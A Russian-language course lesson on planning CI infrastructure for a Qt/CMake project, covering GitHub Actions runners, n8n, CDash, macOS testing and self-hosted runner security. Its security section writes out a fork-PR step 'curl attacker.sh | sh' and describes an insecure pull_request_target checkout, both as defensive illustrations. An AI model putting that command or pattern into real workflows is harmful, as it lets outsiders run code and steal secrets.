## 0. Чему учит урок и как с ним работать

Запрос владельца: «на каком-то этапе поднять на VDS воркеры, настроить инфраструктуру через n8n и
вебхуки, возможно взять бесплатную доску в YouGile».

Урок намеренно стоит последним: инфраструктура — это усилитель того, что уже работает. Стабильного
`ctest --preset` пока нет — усиливать нечего, и любая поднятая машина превращается во вторую работу по
сопровождению. Поэтому здесь мы не настраиваем железо, а принимаем три решения (ADR-0011/0012/0013) и
рисуем порядок, в котором железо появится.

После урока ты должен уметь:

1. Провести границу «что делает CI, что делает n8n» и объяснить цену её нарушения на конкретном
   сценарии сборки.
2. Посчитать стоимость владения стендом: деньги (тариф, macOS-минуты, хранилище) и часы в неделю на
   эксплуатацию — и сказать, какой этап ты **не** делаешь.
3. Описать легальный способ проверять macOS при нулевом бюджете на железо Apple.
4. Назвать четыре контролла, закрывающих вектор «чужой PR → произвольный код на моей машине».
5. Прочитать таблицу этапов I0–I6 как очередь с критериями готовности и сказать, какой этап следующий.
6. Объяснить, почему доска задач — часть контура качества, а не «удобный блокнот».
7. Для каждого этапа I0–I6 назвать артефакт TrafficWatcher, который он производит, и назвать этап, артефакт
   которого ты не можешь указать, — такой этап из плана убирается (§0.2).
8. Показать на двух-трёх конструкциях из уроков 1 и 8, как именно они усложняются в контуре: тот же
   пресет, то же `BUILD_TESTING`, те же лейблы `ctest`, но в режиме, где их исполняет не человек
   (таблица в §0.2 и тонкости §3, §5, §6).

Как устроен каждый раздел теории: **механика** → **почему так сделано** → **что будет, если нарушить** →
**мини-практика**. Абзацы **Тонкость N.** — неочевидные детали уровня middle: каждая проверяется одной
командой, экраном настроек репозитория или строкой в логе раннера.

Термины, которые дальше идут без перевода:

| Термин | Определение |
|---|---|
| **Runner / воркер** | Машина, которая исполняет job CI: GitHub-hosted (чужая, с лимитом минут) или self-hosted (твоя) |
| **Preset-driven CI** | Пайплайн, который вызывает `cmake --preset`, а не собирает команды `-D` руками |
| **Ночной лот (nightly)** | Плановый прогон полного набора, включая то, что не влезает в проверку коммита |
| **Артефакт** | Результат сборки/прогона, сохраняемый отдельно от кода: пакет, JUnit XML, coverage, трасса |
| **n8n** | Инструмент оркестрации «человеческих» шагов по вебхукам: уведомления, задачи, отчёты |
| **Self-hosted RCE-поверхность** | Возможность выполнить произвольный код на твоей машине через чужой pull request |

### 0.1 Почему эти решения принимаются сейчас, а не в M3

| Требование из концепции | Что оно диктует в инфраструктуре |
|---|---|
| Три ОС с одинаковым поведением | состав матрицы фиксируется до появления тестов: иначе «платформенный» вид теста из урока 8 невозможно завести задним числом |
| M3-прогоны длиннее коммит-прогона | нужен отдельный воркер и отдельные лейблы — то есть решение о self-hosted принимается в M1, а не в ночь перед M3 |
| Детерминированность проверяема только историей | CDash-сервер и политика хранения артефактов появляются до первых golden-тестов |
| Проект учебный, время ограничено | каждый этап должен иметь критерий «готово» и явную цену в часах, иначе инфраструктура съедает курс (§8, риск №1) |

Мини-практика 0 (3 минуты). Посмотри официальную страницу лимитов GitHub Actions для своего тарифа и
выпиши три числа: минут в месяц, множитель веса для macOS-раннера, срок хранения артефактов. Эти три
числа — половина ADR-0011: без них разговор «hosted против self-hosted» остаётся мнением.

### 0.2 Приложение: вход → выход

Инфраструктура в этом курсе существует ровно для одного: чтобы сборка, прогон тестов и упаковка
TrafficWatcher происходили не моими руками. Всё, что не относится к этим трём действиям над приложением,
в курс не входит — иначе я получаю вторую работу вместо экономии времени (§8, риск №1).

| | Состояние приложения |
|---|---|
| **Вход** (по плану курса — после модулей 11–12) | `tw_app` с QML-интерфейсом и ядром M1, которое собирается из пресета на трёх ОС, прогоняет `ctest --preset` за 3–5 минут и упаковывается `cpack` в `.msi`/`.deb`/`.dmg`. Это ожидаемое состояние курса: модули 11–12 ещё не пройдены, и потому цифры бюджета в §9 считаются оценкой, а не замером |
| **Вход** (что есть сейчас) | Урок 1 и, возможно, ничего: нет ни `CMakePresets.json`, ни `tests/`, ни пакета. Именно поэтому этот урок стоит последним и сейчас выполняется только его первая часть — три ADR и посчитанный бюджет (§9, «Сейчас») |
| **Выход** | Приложение то же самое, но появляется адрес, где оно собирается: CI-матрица гоняет **его** пресеты и **его** тесты, CDash хранит историю **его** прогонов по трём ОС, артефакт-хранилище держит **его** пакеты, доска содержит **его** фичи и регрессии, nightly прогоняет **его** длинные сценарии. Ни одного сервиса «для инфраструктуры» в выходе нет |
| **Наследство следующему уроку** | Релиз 0.x.0, собранный одним тегом: с этого момента проверка «ничего не сломалось при переносе на другую ОС» перестаёт быть ручным ритуалом и становится свойством контура |

Проверка на абстракность, которую я применяю к каждому пункту §1–§7: у решения должен быть производимый
им артефакт приложения.

| Решение | Артефакт TrafficWatcher, который оно производит |
|---|---|
| Матрица CI (ADR-0011) | собранный `tw_app` + JUnit-отчёт по `ctest -L unit,component` на win/linux/macOS |
| Стратегия macOS (ADR-0012) | `.dmg`, подписанный и проверенный на case-sensitive томе |
| CDash (I3) | история времени шага модели и coverage `tw_core` — то, чем доказывается детерминированность M3 |
| Доска (ADR-0013) | карточка на каждый упавший тест и на каждый баг-регресс из [урока 8](08-testing-strategy.md) §5 |
| Релизный воркфлоу (I5) | тег `v0.x.0` → три пакета + changelog |

Если для пункта таблицы не находится артефакта приложения, он из плана убирается — либо остаётся с явной
оговоркой в ADR, зачем он нужен и чем проверяется его полезность.

**Что усложняется из прошлых уроков.** Контур не вводит новый стек сборки — он берёт конструкции
уроков 1 и 8 и ставит их в условия, где рядом нет человека. Правая колонка — это и есть программа
модулей 11–15: те же файлы, другое поведение.

| Конструкция | Появилась | Как усложняется в контуре |
|---|---|---|
| `cmake --preset win-msvc-debug` | урок 1, §5 | пресет вызывает не человек, а матрица: `$env{QT_DIR}` обязан существовать на трёх разных машинах, и отсутствие переменной превращается в красный job, а не в вопрос «где твой Qt» (§1, I1) |
| `BUILD_TESTING` в `cacheVariables` | урок 1, §5.1 (3) | из одного прогона распадается на два: PR-прогон с тестами и релизный без них; один неверный пресет в I5 — и в `.msi` едут тестовые таргеты |
| генераторные выражения `$<CONFIG:>`, `$<TARGET_FILE_DIR:>` | урок 1, §4.2 | вычисляются на трёх ОС и в контейнере с другим путём к тулчейну: то, что у меня «собирается всегда», там может не собраться ни разу (§8, риск 3) |
| `install(TARGETS)` + `qt_generate_deploy_qml_app_script` | урок 1, §3.2 | становятся отдельным job'ом I2/I5: ошибка deploy-скрипта из фазы install превращается в падение пайплайна на ночном прогоне, а не в «не собралось дома» |
| `add_test` + `ctest -L unit` | урок 8, §3 | `-L`-гейты: PR гоняет `unit,component`, nightly — `long`, sanitizers; и тут же выясняется, что `ctest` без `-j` на 4 vCPU не укладывается в бюджет ADR-0010 (§4 урока 8, тонкость 4) |
| свойства теста `ENVIRONMENT`, `WORKING_DIRECTORY` | урок 8, §3 | в CI рабочая директория и `PATH` к Qt другие: тест, зелёный из IDE, краснеет в job'е, и чинится не кодом, а свойством (I1, §11 строка про флаги) |
| бюджеты времени и базовая линия | урок 8, §4 | превращаются в метрики CDash (I3): бюджет без истории — обещание, которое никто не проверяет |

## 1. Что должно быть в итоге (целевая картина)

```
                        ┌───────────────────────────── VDS (Linux, 4–8 vCPU) ─────────────────────────────┐
 GitHub (репо, PR) ───▶ │  runner (self-hosted): docker-образы с Qt 6.10.2 + cmake + ninja + ccache        │
        │ webhook       │  ├─ job: configure/build/test × {gcc, clang} × {debug, release, asan, tsan}       │
        ▼               │  ├─ job: cpack → артефакты                                                       │
   ┌──────────┐         │  └─ job: coverage / qmllint / clang-tidy → отчёты                                 │
   │   n8n    │◀────────┤  CDash (docker): сборка/тесты/coverage/notes, история по 3 ОС                     │
   │ webhook  │         │  Артефакт-хранилище: registry/S3(minio)/nginx-static + подписанные релизы         │
   └────┬─────┘         │  Мониторинг: node_exporter + alerts → n8n                                         │
        │               └──────────────────────────────────────────────────────────────────────────────────┘
        ├──▶ YouGile: задачи из упавших ночных прогонов, статусы по коммитам, доска модулей курса
        ├──▶ Telegram/почта: «nightly красный», «релиз 0.3.0 собран»
        └──▶ Release-воркфлоу: tag → cpack на 3 платформах → артефакты → changelog → announce
```

Три ОС в матрице: **Linux и Windows** живут на VDS (Windows-воркер требует лицензии/VRT — либо Windows-серверный
тариф VDS, либо отдельная машина). **macOS** — отдельная история, см. §4: это единственный пункт, где «просто VDS»
не решает.

## 2. Граница ответственности: CI vs n8n

Это ключевое архитектурное решение, и именно на нём чаще всего строят лишнюю инфраструктуру: инструмент
вебхуков технически умеет запускать команды, поэтому возникает соблазн собирать проект в нём.

| Делает CI (GitHub Actions / GitLab CI) | Делает n8n |
|---|---|
| собрать, прогнать тесты, посчитать coverage, собрать пакет | получить webhook о статусе сборки |
| артефакты сборки и тестовых отчётов | послать уведомление/алерт, открыть задачу в YouGile |
| релизный пайплайн (tag → cpack → publish) | оркестрация «человеческих» шагов: аппрув релиза, пост в чат, обновление доски, регрессионный отчёт за неделю |
| кэширование, матрицы, средние прогоны | агрегация метрик из CDash/YouGile в отчёт |

**Почему граница проходит именно по компиляции.** У CI есть три вещи, которых нет у универсального
инструмента автоматизации: контекст коммита (кто, что и из какого PR изменил), матрица (одно описание ×
N окружений) и хранилище артефактов с историей. Компиляция проекта имеет смысл только вместе с этими
тремя: сборка «вообще» не отвечает на вопрос «почему оно покраснело именно после этого коммита». n8n не
знает ни автора, ни diff, ни конфигураций — он знает только «пришёл webhook».

Правило: **ни одной компиляции внутри n8n.** Воркфлоу, который `ssh`-ится на машину и запускает
`cmake --build`, не имеет ни истории, ни матрицы, ни кэша, ни логов в привычном виде — и через месяц
становится единственным местом, где можно узнать, почему сборка красная, причём узнать постфактум.
n8n — связующее звено и уведомления, CI исполняет сборку.

| Если нарушить границу | Что произойдёт |
|---|---|
| Сборка в n8n по `ssh` | нет диффа и автора у падения; «красно» невозможно связать с коммитом, расследование начинается с ручного просмотра машины |
| Уведомления и задачи прямо из workflow-файлов | каждый чат/борд-фикс правит `.yml` в основном репозитории; политика уведомлений перестаёт быть переносимой |
| И то и другое на одной машине | секрет борда лежит рядом с воркером, который исполняет чужой код (§5) |

Мини-практика 1 (5 минут). Возьми один сценарий — «ночной прогон упал» — и распиши его по шагам на двух
колонках таблицы выше. Каждый шаг, для которого тебе пришлось бы написать в n8n `exec`/`ssh`, — ошибка
границы: он должен быть job'ом CI, после которого CI шлёт webhook, а n8n открывает задачу. Проверь
результат вопросом «есть ли у шага автор коммита?» — если нет, шагу не место в CI.

## 3. Выбор CI-движка (фиксируем ADR-0011)

| Вариант | Плюсы | Минусы для нас |
|---|---|---|
| **GitHub-hosted + Actions** (репо уже на GitHub) | ноль своей инфраструктуры, есть macOS-раннеры, кэш Qt через `actions/cache` | лимиты минут (macOS ×10 вес), нет дешёвых «жирных» машин для M3-нагрузки |
| **GitHub Actions + self-hosted runner на VDS** | один язык описания, Linux+Win воркеры, быстрые диски/кэш, бесплатно при публичном репо | runner = RCE-поверхность (см. §5), macOS всё равно не тут |
| GitLab CE + own runners | полный контроль над пайплайном, встроенный registry, зрелые pipeline/DAG | тянуть self-hosted GitLab ради одного проекта — лишняя эксплуатация |
| Jenkins | максимальная гибкость, плагины под всё | эксплуатация и скорость плагинов — отдельная работа |
| Woodpecker / Drone / Gitea Actions | лёгкие, docker-native | меньше экосистемы, свой инсталл |

Реалистичный план: **гибрид** — GitHub Actions как оркестратор и описание пайплайнов, self-hosted runner на VDS
для Linux/Windows-тяжести, GitHub-hosted macOS для «собралось-протестировалось». M3-ночные прогоны — только self-hosted.

Почему гибрид, а не один инструмент на всё: у задачи два разных ограничителя. Проверка коммита обязана
быть быстрой и не требовать моего участия в эксплуатации — это hosted-раннеры. Ночной прогон M3 требует
жирного железа и десятков минут, которые в hosted-тарифе стоят кратно дороже (macOS — ещё и вес ×10) —
это self-hosted. Один движок на оба случая либо дорог, либо медлителен; описывается всё одним языком,
поэтому расщепление не плодит второй набор конфигов.

**Тонкость 1.** Матрица без `concurrency` стоит денег там, где их не ждут. Десять push в
ветке за двадцать минут — это десять полных прогонов × N осей матрицы, и на self-hosted они выстроятся
в очередь на одну машину: последние сборки придут после того, как код уже переписан. В hosted — просто
сгорят минуты тарифа. Поэтому в каждом workflow с самого начала:

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.ref != 'refs/heads/master' }}
```

`cancel-in-progress` с условием: в `master` (и в теге релиза) прогон доводится до конца — он источник
истории на CDash и артефактов, всё остальное отменяется. Проверка: три push подряд в ветку и одна
отменённая строка в списке runs.

**Тонкость 2.** Цепочку «configure → build → test → submit» можно не описывать вручную: если в
`CMakePresets.json` (схема v6, CMake ≥ 3.25) объявлен `workflowPresets`, CI-шаг превращается в
`cmake --workflow --preset <имя>`, и порядок шагов, их `configurePreset` и `configuration` живут в одном
файле с остальными требованиями сборки. Проверить доступность на своей машине — `cmake --help |
Select-String workflow`; если опции нет, твой CMake старше 3.25 и в ADR-0011 фиксируется ручная цепочка.
Выигрыш не в длине YAML, а в том, что локальный прогон и CI вызывают один и тот же объект: рассинхрон
«в CI другой порядок шагов» становится невозможен по построению (ср. §11, строка про флаги).

## 4. Честный разговор про macOS

Распространёемое заблуждение: «VDS = 3 платформы». Практика:

- Запуск macOS в виртуалке на стороннем железе нарушает лицензию Apple; легальные пути — железо Apple
  (свой Mac mini как воркер, colocation с Mac) или облако с Apple Silicon (Scaleway, MacStadium,
  AWS/Oracle bare-metal Mac), и это дороже Linux-воркера в разы.
- Дешёвая стартовая позиция: **кросс-компиляции нет**, поэтому macOS проверяем на GitHub-hosted `macos-14`
  (arm64) в CI-матрице, а локально — раз в неделю на «ночном» прогоне.
- Что обязательно учитывать уже в M1: `deploy`/CPack-генератор (`DragNDrop`), `codesign`/notarization
  (нужен Apple ID + App-specific password → секреты в CI), case-sensitive filesystem (`Case Sensitive` volume
  ловит регистрозависимые include-пути), разницу путей (`/` vs `\`), GCD/opengl→Metal особенности.

Решение оформляем ADR-0012: «где и как мы вообще проверяем macOS».

**Почему это обсуждается в инфраструктуре, а не в модуле деплоя:** потому что проверка macOS — это
решение про **железо и секреты**, а не про CMake. `codesign` требует Apple ID и App-specific password,
то есть секрет в CI; notarization требует сети и времени, то есть отдельный job; case-sensitive volume
требует отдельного тома на воркере, иначе регистрозависимые include-пути останутся непроверенными до
первого отчёта от пользователя. Ни одно из четырёх не появляется «самоё» при написании
`deploy.cmake.in`.

| Если отложить на M3 | Что придётся переделывать |
|---|---|
| Секреты Apple не заведены | релизный пайплайн I5 сначала пишется без подписи, «временным решением», а временные решения живут до релиза |
| Том, чувствительный к регистру, не проверяется | все заголовки с неправильным регистром в `#include` всплывают на чужой машине: правка на строчку, но в каждом втором файле |
| `DragNDrop`-генератор не выбран в CPack | конфиг пакетирования переписывается вместе с первым релизом, и первый релиз делается вслепую |

Мини-практика 2 (5 минут). Проверь утверждение про регистр: открой любой свой `.cpp` и перепиши один
`#include` в другом регистре, затем собери. На Windows сборка пройдёт — компилятору всё равно, — и это
ровно та причина, по которой нам нужен прогон на третьей платформе, а не «я же у себя собрал».

## 5. Безопасность self-hosted воркеров (обязательный минимум)

1. Runner — в **отдельном контейнере/вм** с минимальными правами, не под моим пользователем и не в docker-sock-режиме.
2. Для публичного репо: **только после approve** запускать пайплайны из fork PR (`workflows: approve`),
   секреты недоступны в `pull_request` от fork.
3. Секреты (Apple ID, Telegram bot token, YouGile API) — в секретах CI/в vault, не в `n8n` credentials в открытом виде
   на той же машине, где воркер.
4. Вебхуки — с HMAC-подписью и проверкой на приёме; URL не светить в README.
5. VDS: `fail2ban`/ключами-только SSH, обновления образа Qt-тулчейна по тегу (`qt6102:2026.11`), а не «руками обновили».
6. Бэкапы: CDash DB, workflow-журналы, артефакты релизов. Тест «восстановили за 30 минут» — раз в квартал.

**Как это читается: сценарий «чужой PR → моя машина».** Шаги атаки, если ни одного контролла нет:

1. Злоумышленник форкает публичный репозиторий и открывает PR, где в `.github/workflows/*.yml` добавлен
   шаг `run: curl attacker.sh | sh`.
2. GitHub запускает workflow от имени воркеров, помеченных `pull_request` — то есть на **моём**
   self-hosted runner'е, потому что я не ограничил запуск для fork-PR.
3. Скрипт читает переменные окружения и файлы секрета на машине (Apple ID, Telegram-токен, ключ борда) и
   уносит их: у процесса runner'а есть права моего пользователя.
4. Дальше подменённый артефакт попадает в релиз, потому что релизный job берёт тот же образ.

Контролли выше закрывают шаги по номеру: п.1 и п.2 — отдельный контейнер без прав и без docker-sock,
п.2 — ручной approve workflow из fork и запрет секретов в `pull_request` от форка, п.3 — секреты не на
машине воркера, п.4 — подпись артефактов и отдельно защищённый релизный job. Самый дорогой по удобству —
approve: он ломает «залил PR и ушёл», и именно поэтому он должен быть решением, а не случайностью.

**Тонкость 3.** Разница между `pull_request` и `pull_request_target` — это разница между «чужой код без
секретов» и «свой код с чужими аргументами», и на ней чаще всего строят дыру. Событие `pull_request` из
форка выполняется workflow-файлом **из форка**, но без секретов и с токеном только на чтение; отсюда и
весь сценарий выше про self-hosted runner. Событие `pull_request_target` выполняется файлом **из
базового репозитория** и **с секретами** — удобно, чтобы пускать внешние PR в защищённый прогон, и
достаточно одного шага `actions/checkout` с `ref: ${{ github.event.pull_request.head.sha }}`, чтобы в
этот job приехал чужой код вместе с токеном записи и всеми секретами. Правило на курс: `*_target`
разрешён только в одном месте (комментарии/бейджи, где ничего не собирается), и там `checkout` чужого
кода невозможен ни явно, ни через action-обёртку.

Проверить свои формулировки до первого workflow: в настройках репозитория
«Actions → General → Workflow permissions» посмотреть, какой токен выдаётся по умолчанию, и в
ADR-0011 записать уровень `permissions:` для каждого workflow (`contents: read` как базовый, запись —
только там, где она нужна: `actions: write` для отмены, `checks: write` для статусов). Минимальный
токен не спасает от `*_target`, но делает ошибку в одном workflow неповторимой в остальных.

## 6. Порядок внедрения (этапы, каждый — с проверкой)

| Этап | Что делаем | Артефакт приложения на выходе | Критерий «готово» |
|---|---|---|---|
| **I0** | Всё локально: пресеты + `ctest --preset` + `cpack` | собранный `tw_app` + зелёный прогон + распаковываемый пакет | зелёный прогон с чистого `build/` на своей машине |
| **I1** | GitHub-hosted matrix (win + linux), конфиг через те же пресеты | два `tw_app` (win/linux) + JUnit-отчёт в артефактах PR | PR не мержится без зелёного CI |
| **I2** | VDS + self-hosted runner (Linux), docker-образ с Qt/cmake/ninja, ccache-волум | пакет с версией тулчейна в имени + то же время сборки, что локально | время сборки с кэшем ≤ 40% от холодной; артефакты хранятся 30 дней |
| **I3** | CDash на VDS, `ctest_submit()` из CI и с локальной машины | страница с историей тестов `tw_core` и coverage-трендом по 3 платформам | 3 платформы × 2 конфигурации, история ≥ 2 недель, coverage-тренд |
| **I4** | n8n: уведомления о красных сборках + авто-задачи в YouGile по упавшим тестам | карточка, привязанная к упавшему тесту: лот, коммит, ссылка на лог | «nightly красный» → задача в доске ≤ 5 минут, без моего участия |
| **I5** | Релизный воркфлоу: tag → cpack(3 ОС) → changelog → announce | `.msi`/`.deb`/`.dmg` версии 0.x.0 + changelog | релиз 0.x.0 собран и опубликован одной командой/тегом |
| **I6** | Ночные лоты: sanitizers, fuzz, `long`-прогоны M3, benchmark-пороги | трасса golden-прогона + график времени шага модели | алерт при деградации времени шага модели > 15% |

Почему порядок именно такой и почему его нельзя переставить: каждый этап использует выход предыдущего.
I0 даёт пресеты — без них I1 превращается в набор ручных `-D`-команд, которые потом надо переписывать.
I1 даёт воспроизводимую проверку коммита — до неё нет смысла в собственном железе (I2), потому что
не нужно ничего кэшировать и нечего ускорять. I3 (CDash) требует работающего прогона, иначе страница сервера
пустая и «истории метрик», ради которой сервер затевался, не будет никогда. I4–I6 автоматизируют то, что
уже стабильно: автоматизация нестабильного контура даёт вторую работу по сопровождению вместо экономии.

Практический критерий перестановки: этап можно поднять раньше, если у тебя уже есть **зелёный прогон
предыдущего этапа на чистом `build/`**. Другого основания перепрыгивать нет.

Мини-практика 3 (2 минуты). Отметь в таблице выше, где ты сейчас: почти наверняка это «до I0», потому
что `ctest --preset` появится только с уроком 1 ([§7.2, п.9](01-cmake-target-model.md)). Запиши дату
I0-готовности в доску задач — иначе «сначала инфраструктура» победит «сначала курс».

**Тонкость 4.** В I2 кэшируют **ccache, а не `build/`**, и причина в абсолютных путях. `CMakeCache.txt`
и базы Ninja/MSBuild содержат пути конкретной директории конкретной машины: перенесённый между раннерами
или между контейнерами с разным mount-путём кэш даёт либо ошибку конфигурации, либо — хуже — молча
собирает не то. Рабочая форма: том с `~/.cache/ccache` + фиксированный путь исходников внутри контейнера
(`WORKDIR /src`) + ключ кэша из `hashFiles('**/CMakeLists.txt', '**/*.cmake', 'CMakePresets.json')`.
Проверяется одной цифрой: время cold-прогона против времени прогона с попаданием в кэш — это и есть
критерий I2 (≤ 40%), а не «кэш подключён». В вопросе 7 файла ответов те же три слоя кэша — отвечая на
него, добавь к каждому четвёртое измерение: переносим ли этот слой между машинами и почему.

**Тонкость 5.** У истории CDash есть адрес, и зовут его `Site`: лоты группируются по имени сайта,
которое CTest по умолчанию берёт из hostname машины (`site_name()`). На self-hosted runner в контейнере,
пересоздаваемом каждый прогон, hostname новый, и через неделю на дашборде столько же «платформ», сколько
было прогонов, — а графика деградации времени шага модели, ради которой всё и затевалось, не появляется.
Лечится явным `set(Site "win-msvc-selfhosted")` в CTest-скрипте (или эквивалентом из `CTestConfig.cmake`;
механика — модуль 12) и проверяется списком сайтов на странице: их должно быть столько, сколько осей
матрицы, и ни одним больше.

**Тонкость 6.** На Windows-раннере шаг может «упасть успешно». GitHub Actions проверяет код возврата
команды оболочки, а PowerShell 5.1 (`shell: powershell`) не прерывает скрипт по ошибке нативной утилиты:
`cmake --build .` с кодом 2 продолжит выполнение следующих строк, и job останется зелёным, если
последняя команда шаблона вернула 0. Минимальная защита в каждом `run`-блоке:
`$ErrorActionPreference = 'Stop'` и явная проверка `if ($LASTEXITCODE) { exit $LASTEXITCODE }` после
`cmake`/`ctest`, либо `shell: pwsh` с такой же проверкой. Проверяется за минуту: шаг, который вызывает
`cmake --preset` с несуществующим именем, — и смотреть надо не на текст ошибки в логе, а на цвет job'а.

## 7. YouGile (или чем заменим) как доска

Назначение доски — не «ещё одно место, где ничего нет», а внешний контур проверки обещаний: у каждого
упавшего прогона и каждого найденного бага есть карточка с критерием приёмки.

- Эпики = вехи (M1/M2/M3), задачи = **уроки курса + фичи + баг-регрессии** (у каждого бага задача = тест).
- В задаче обязательны: ссылка на ADR/урок, критерии приёмки (гейты из [урока 8](08-testing-strategy.md) §6),
  тип теста, который покрывает.
- Автоматизация через n8n: красный CDash-лот → задача с логом; force-push/rebase → комментарий; tag релиза → карточка «релиз собран, артефакты тут».
- Альтернативы, если бесплатного лимита не хватит: GitHub Projects + Issues (тогда n8n почти не нужен),
  YouTrack (бесплатен до 10 пользователей, сильная автоматизация), Kaiten, Trello. Выбор — ADR-0013.

## 8. Бюджет и риски (чтобы решение было осознанным)

| Риск | Вероятность | Что делаем |
|---|---|---|

| Долгие M3-прогоны на 4 vCPU | высокая | отдельные лейблы `long`, параллелим по сценариям, результат — трассы в артефактах |
| Секрет-утечка через self-hosted runner в публичном репо | низкая, фатальная | §5, пункт 2 |

## 11. Диагнозы: симптом → куда смотреть

| Симптом | Настоящая причина | Что делать |
|---|---|---|
| В CI другие флаги, чем локально | workflow вызывает `cmake -D...` руками | только `cmake --preset` (§2); расхождение проверяется диффом `CMakeCache.txt` из артефакта |
| Сборка на runner'е зелёная, у меня красная | образ тулчейна разошёлся с локальным китом Qt | версия Qt пинится в образе и в пресете, CI падает на mismatch (§8, риск 3) |
| Квота минут GitHub кончилась на второй неделе | macOS-job гоняется на каждый push | вес macOS-раннеров выше; их прогон — по тегу/nightly, а не по коммиту (§3, мини-практика 0) |
| «Ночной прогон красный», но непонятно, что упало | артефакты прогона не сохраняются | JUnit XML + coverage + логи всегда в артефактах ([урок 8](08-testing-strategy.md) §5, п.6) |
| Runner не берёт job | теги `runs-on` не совпадают с метками self-hosted | `config.sh --labels`, затем `runs-on: [self-hosted, linux, qt6102]` |
| Задача на доске появилась, а лога нет | webhook отдаёт только статус | n8n должен запрашивать API CI за артефактами, а не тащить текст лога через webhook (§2) |
| Job зелёный, хотя `cmake` падал с кодом 2 | PowerShell не прерывает скрипт по коду возврата нативной команды | `$ErrorActionPreference = 'Stop'` + проверка `$LASTEXITCODE` (тонкость 6, §6) |
| На CDash каждая сборка появляется как новая платформа | `Site` = hostname эфемерного контейнера раннера | явное имя сайта в CTest-скрипте (тонкость 5, §6); проверка — список сайтов |
| Кэш «не работает» или сборка ведёт себя странно после restore | в кэш лёг `build/` с абсолютными путями другой машины | кэшировать ccache, путь к исходникам в контейнере зафиксировать (тонкость 4, §6) |
